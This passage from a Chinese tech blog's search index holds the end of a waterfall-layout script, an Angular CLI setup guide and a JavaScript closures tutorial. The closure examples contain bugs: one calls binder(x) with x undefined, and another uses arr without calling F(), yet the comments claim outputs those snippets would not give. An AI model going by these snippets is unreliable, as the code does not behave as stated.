= <span class="string">'position:absolute;top:'</span> + minH + <span class="string">'px;left:'</span> + aBoxArr[minHIndex].offsetLeft + <span class="string">'px'</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//添加元素之后更新hArr</span></span><br><span class="line">            hArr[minHIndex] += aBoxArr[i].offsetHeight;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取最小索引值</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getMinHIndex</span>(<span class="params">arr, val</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i <span class="keyword">in</span> arr) &#123;</span><br><span class="line">        <span class="keyword">if</span> (arr[i] == val) &#123;</span><br><span class="line">            <span class="keyword">return</span> i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//检查是否满足加载数据的条件</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkScrollSlide</span>(<span class="params">parent, clsName</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> oParent = <span class="built_in">document</span>.getElementById(parent);</span><br><span class="line">    <span class="keyword">var</span> aBoxArr = oParent.getElementsByClassName(clsName);</span><br><span class="line">    <span class="comment">//最后一个box元素的offsetTop+高度的一半</span></span><br><span class="line">    <span class="keyword">var</span> lastBoxH = aBoxArr[aBoxArr.length - <span class="number">1</span>].offsetTop + aBoxArr[aBoxArr.length - <span class="number">1</span>].offsetHeight / <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> scrollTop = <span class="built_in">document</span>.documentElement.scrollTop || <span class="built_in">document</span>.body.scrollTop;</span><br><span class="line">    <span class="keyword">var</span> height = <span class="built_in">document</span>.documentElement.clientHeight || <span class="built_in">document</span>.body.clientHeight;</span><br><span class="line">    <span class="keyword">return</span> lastBoxH &lt; scrollTop + height;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后走一波效果图</p><p><img src="http://images2015.cnblogs.com/blog/1140602/201706/1140602-20170614004905400-394825169.gif" /><p><p>　　</p>]]></content>
      
      
      <categories>
          
          <category> HTML/CSS </category>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSS </tag>
            
            <tag> Layout </tag>
            
            <tag> JavaScript </tag>
            
            <tag> 瀑布流 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Angule Cli创建Angular项目</title>
      <link href="/2017/05/27/js-AngularCli20170527/"/>
      <url>/2017/05/27/js-AngularCli20170527/</url>
      
        <content type="html"><![CDATA[<p><img src="https://images2015.cnblogs.com/blog/1140602/201705/1140602-20170521131215853-1429491603.png" alt=""></p><p>Angular4.0来了，更小，更快，改动少</p><p>接下来为Angular4.0准备环境和学会使用Angular cli项目</p><a id="more"></a><h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><p>1）在开始工作之前我们必须设置好开发环境</p><p>如果你的机器上还没有安装Node.js和npm，请安装他们</p><p>（这里特别推荐使用淘宝的镜像cnpm，记得以后把npm的指令改为cnpm就可以了）</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">npm install -g cnpm --registry=https:<span class="comment">//registry.npm.taobao.org</span></span><br></pre></td></tr></table></figure><p>然后我们可以通过node -v和cnpm -v来分别查看node和cnpm安装的版本和结果</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">node -v</span><br><span class="line">cnpm -v</span><br></pre></td></tr></table></figure><p>2）安装全局Angular cli</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">cnpm install -g @angular/cli</span><br></pre></td></tr></table></figure><h1 id="创建新的项目"><a href="#创建新的项目" class="headerlink" title="创建新的项目"></a>创建新的项目</h1><p>　　打开终端窗口（这里我使用的是webstorm的Terminal，也可以使用计算机自带的powershell）</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">ng <span class="keyword">new</span> my-app</span><br></pre></td></tr></table></figure><p>项目会很快创建完成，接下来你会看到</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">Installing packages <span class="keyword">for</span> tooling via npm</span><br></pre></td></tr></table></figure><p>这里如果你选这了淘宝的cnmp镜像，应该最好在安装完全局Angular cli后设置一下，保证正常下载工具</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">ng <span class="keyword">set</span> --global packageManager = cnpm</span><br></pre></td></tr></table></figure><p>然后我们的项目就创建完成了</p><p><img src="https://images2015.cnblogs.com/blog/1140602/201705/1140602-20170521134325432-1354080667.png" alt=""></p><p>我们会发现在文档中有很多文件，这里参考<a href="https://angular.cn/" target="_blank" rel="noopener">Angular</a>官方文档 ，以便认识这些文件的作用。</p><h1 id="在项目中引入bootstrap和jQuery"><a href="#在项目中引入bootstrap和jQuery" class="headerlink" title="在项目中引入bootstrap和jQuery"></a>在项目中引入bootstrap和jQuery</h1><p>　　　　这里我使用webstorm的Terminal，直接在终端操作</p><p>cnpm install bootstrap –save<br>cnpm install jquery –save<br>我们在项目中就添加了bootstrap和jQuery，我们可以在node_modules文件夹中找到他们（这个文件夹放的是第三方库）；</p><p>然后我们需要操作.angular-cli.json文件，把bootstrap和jQuery添加进去:<br><img src="https://images2015.cnblogs.com/blog/1140602/201705/1140602-20170521135435088-196815303.png" alt=""><br>这里需要注意的是：因为angular用的是微软开发的typescript语言，我们需要在终端做下面的操作，以便让typescript认识bootstrap和jQuery一些字符（比如jQuery的$）：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">cnpm install @types/bootstrap --save-dev</span><br><span class="line">cnpm install @types/jquery --save-dev</span><br></pre></td></tr></table></figure><p>这样我们就在项目中正常使用bootstrap和jQuery了</p><h1 id="项目的启动"><a href="#项目的启动" class="headerlink" title="项目的启动"></a>项目的启动</h1><p>启动项目我们可以直接通过：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">ng serve</span><br><span class="line"><span class="comment">// 或者是</span></span><br><span class="line">npm start</span><br></pre></td></tr></table></figure><p>这两个的默认端口都是4200：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//localhost:4200</span></span><br><span class="line"><span class="string">``</span><span class="string">` </span></span><br><span class="line"><span class="string">这里你也可以修改默认的端口:</span></span><br><span class="line"><span class="string">`</span><span class="string">``</span>js</span><br><span class="line">ng serve -p <span class="number">3000</span></span><br></pre></td></tr></table></figure><h1 id="最后项目的打包"><a href="#最后项目的打包" class="headerlink" title="最后项目的打包"></a>最后项目的打包</h1><p>用angular cli创建的项目会有很多文件，我们就需要打包后再发行：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">ng build</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>闭包初体验</title>
      <link href="/2017/05/03/js-closure20170503/"/>
      <url>/2017/05/03/js-closure20170503/</url>
      
        <content type="html"><![CDATA[<p>首先，在理解闭包之前：</p><p>我们首先应该清楚下作用域和作用域链</p><p>作用域：每个函数定义时创建时自己的环境即作用域</p><p>作用域链：函数内可访问自身和父级作用域中的变量，函数外不可访问函数内的私有变量</p><a id="more"></a><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> b = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line">f();        <span class="comment">// 1</span></span><br><span class="line">b;          <span class="comment">// ReferenceError: b is not defined</span></span><br></pre></td></tr></table></figure><p>在这里，变量a是属于全局域的，变量b的作用域就在函数f()内了，所以：</p><blockquote><p>在f()内，a和b都是可见的；在f()外，a是可见的，b则不可见；</p></blockquote><p>下面是我在控制台中测试：可以更好的理解作用域链。</p><p><img src="https://images2015.cnblogs.com/blog/1140602/201704/1140602-20170426213921397-539687826.png" alt=""></p><p>在outer内定义了另一个函数inner；那么在inner()中可以访问的变量既可以来自他自身的作用域，也可以来自其“父级”的作用域。这就形成了一条作用域链，该链的长度取决于我们的需要。</p><p>接下来我们就可以正式认识下闭包了：</p><p>我们通过闭包来突破作用域链的过程，也许你会发现其中的乐趣</p><p>首先我们看下下面的代码：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="string">'global variable'</span>;</span><br><span class="line"><span class="keyword">var</span> F = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> b = <span class="string">"local variable"</span>;</span><br><span class="line">    <span class="keyword">var</span> N = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> c = <span class="string">"inner local"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们假想全局作用域为G，我们可以将其视为可以包含一切的宇宙</p><p>然后就是本地空间F</p><p>在F内部，还有F的私有内部空间N</p><blockquote><p>当我们将N的空间扩展到F以外，并且止步于全局空间内部时，就产生了一种有趣的东西——闭包</p></blockquote><h3 id="闭包-1"><a href="#闭包-1" class="headerlink" title="闭包#1"></a>闭包#1</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="string">'global variable'</span>;</span><br><span class="line"><span class="keyword">var</span> F = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> b = <span class="string">"local variable"</span>;</span><br><span class="line">    <span class="keyword">var</span> N = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> c = <span class="string">"inner local"</span>;</span><br><span class="line">        <span class="keyword">return</span> b;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> N;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">b;        <span class="comment">//ReferenceError : b is not defined    </span></span><br><span class="line">         <span class="comment">//函数F中包含了局部变量b,因此后者在全局空间里是不可见的</span></span><br><span class="line">N()     <span class="comment">//ReferenceError : N is not defined</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//很明显当我们在全局中调用私有函数N时，会抛出错误；我们在全局中是无法访问一个函数内的私有函数的</span></span><br></pre></td></tr></table></figure><p>上面的代码在控制台中的返回结果：</p><p>接下来，我们在控制台中完整正确测试一次：</p><p>解读:</p><p>首先，在函数N()内部，我们是可以获得b的返回值的（来自于他的父级作用域，可以访问到），我们将b的值作为私有函数N的返回值（如果这时我们在全局中调用函数N(),仍然会抛出错误，见上面代码）</p><p>于是，我们要解决这个问题。将F的私有函数N作为F()的返回值。</p><p>接着，把函数F()赋值给另一个全局变量(实际上是将F()的返回值赋值给了一个全局变量)</p><p>从而生成了一个可以访问F()私有空间的全局函数。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> inner = F();</span><br><span class="line">inner ();         <span class="comment">//local variable</span></span><br></pre></td></tr></table></figure><h3 id="闭包-2"><a href="#闭包-2" class="headerlink" title="闭包#2"></a>闭包#2</h3><p>下面这种方法结果与之前相同，实现上略有不同。</p><p>在这里F()不在返回函数了，而是直接在函数体内创建了一个新的全局函数inner()</p><p>(首先：我们声明一个占位符，尽管这不是必须的，最好还是声明一下)</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> inner;        <span class="comment">//placeholder 占位符</span></span><br><span class="line"><span class="keyword">var</span> F = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> b = <span class="string">"local variable"</span>;</span><br><span class="line">    <span class="keyword">var</span> N = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> b;</span><br><span class="line">    &#125;;</span><br><span class="line">    inner = N ;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>现在我们可以自行测试一下</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">F();          <span class="comment">/*undefined*/</span></span><br><span class="line">inner();    <span class="comment">/*local variable*/</span></span><br></pre></td></tr></table></figure><p>解读:</p><p>我们在函数F()内定义了一个新的函数N(),并将它赋值给全局变量inner。</p><p>由于N()是在F()内定义的，他可以访问到F()的作用域，所以即使该函数后来升级成了全局函数，但是它依然可以保留对F()作用域的访问权</p><h3 id="相关定义与闭包-3"><a href="#相关定义与闭包-3" class="headerlink" title="相关定义与闭包#3"></a>相关定义与闭包#3</h3><p>接下来，我们这次使用函数参数。</p><p>我们在这里创建了一个函数，该函数将返回一个子函数，而这个子函数返回的则是父函数的参数</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">F</span>(<span class="params">param</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> N = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> param;</span><br><span class="line">    &#125;;</span><br><span class="line">    param++;</span><br><span class="line">    <span class="keyword">return</span> N;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>我在控制台中做了测试：</p><p>发现:返回函数被调用时，param++已经执行过一次递增操作了，inner()返回的是更新后的值</p><p>由此我们可以看出：函数绑定的是作用域本身（！*！）而不是在函数定义时该作用域中的变量或当前变量所返回的值</p><h3 id="循环中的闭包-4"><a href="#循环中的闭包-4" class="headerlink" title="循环中的闭包#4"></a>循环中的闭包#4</h3><p>我们首先看一下新手在闭包中容易犯的错误：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">F</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> arr = [], i ;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)&#123;</span><br><span class="line">        arr[i] = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> i;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> arr;</span><br><span class="line">&#125;</span><br><span class="line">arr[<span class="number">0</span>]();    <span class="comment">/*3*/</span></span><br><span class="line">arr[<span class="number">1</span>]();    <span class="comment">/*3*/</span></span><br><span class="line">arr[<span class="number">2</span>]();    <span class="comment">/*3*/</span></span><br></pre></td></tr></table></figure><p>显然这并不是我们想要的结果：</p><p>　　在这里，我们创建了三个闭包，而三个闭包都指向了一个共同的局部变量i，</p><p>　　但是闭包并不会记录他们的值，他们所拥有的的只是相关作用域在创建时的一个连接（即引用）</p><p>　　在这个例子中，变量i恰巧存在于定义这三个函数域中。对这三个函数中的任何一个而言，当他要去获取某个值时，他会从其所在的域开始逐级寻找那个距离最近的i值。由于循环结束时i的值为3，所以这三个函数都指向了一个共同值。</p><p>我们换一种闭包的形式：（来解决这个问题）</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">F</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> arr = [], i ;      </span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)&#123;</span><br><span class="line">          arr[i] = (<span class="function"><span class="keyword">function</span> (<span class="params">x</span>) </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">                      <span class="keyword">return</span> x;</span><br><span class="line">               &#125;    </span><br><span class="line">           &#125; (i));</span><br><span class="line">      &#125;  </span><br><span class="line">     <span class="keyword">return</span> arr;</span><br><span class="line"> &#125;        </span><br><span class="line"> </span><br><span class="line"> <span class="keyword">var</span> arr = F();</span><br><span class="line"> arr[<span class="number">0</span>]()            <span class="comment">/*0*/</span></span><br><span class="line"> arr[<span class="number">1</span>]()            <span class="comment">/*1*/</span></span><br><span class="line"> arr[<span class="number">2</span>]()            <span class="comment">/*2*/</span></span><br></pre></td></tr></table></figure><p>我们还可以定义一个正常点的函数 （不使用即时函数）来实现相同的功能。</p><p>要点是在每次迭代中，我们要在中间函数内将i的值“本地化”<br>s</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">F</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">　 <span class="function"><span class="keyword">function</span> <span class="title">binder</span>(<span class="params">x</span>)</span>&#123;　</span><br><span class="line">         <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> x;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> arr = [], i ;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)&#123;</span><br><span class="line">        arr[i] = binder(x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> arr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> arr = F()</span><br><span class="line">arr[<span class="number">0</span>]()         <span class="comment">/*0*/</span></span><br><span class="line">arr[<span class="number">1</span>]()         <span class="comment">/*1*/</span></span><br><span class="line">arr[<span class="number">2</span>]()         <span class="comment">/*2*/</span></span><br></pre></td></tr></table></figure><p>最后，希望自己在实战中深入理解闭包的巧妙和乐趣。</p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
